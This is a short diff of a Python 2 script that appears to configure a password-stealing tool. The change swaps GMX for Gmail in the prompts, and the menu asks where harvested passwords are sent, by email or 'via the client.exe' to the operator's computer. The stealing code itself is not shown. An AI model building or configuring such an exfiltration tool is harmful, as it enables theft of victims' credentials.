@@ -26,8 +26,8 @@ while loop == True:
     print "(2) - via the client.exe (to your computer directly)\n"
     option = raw_input('\nChoose a number [1-2]: ')
     if option == "1":
-        email = raw_input("Input your GMX email address: ")
-        pwd = raw_input("Input your GMX password: ")
+        email = raw_input("Input your Gmail address: ")
+        pwd = raw_input("Input your Gmail password: ")
         mailto = raw_input(
             "Input the email you want to send the passwords to. Leave black to send it to yourself: ")
         if not mailto:
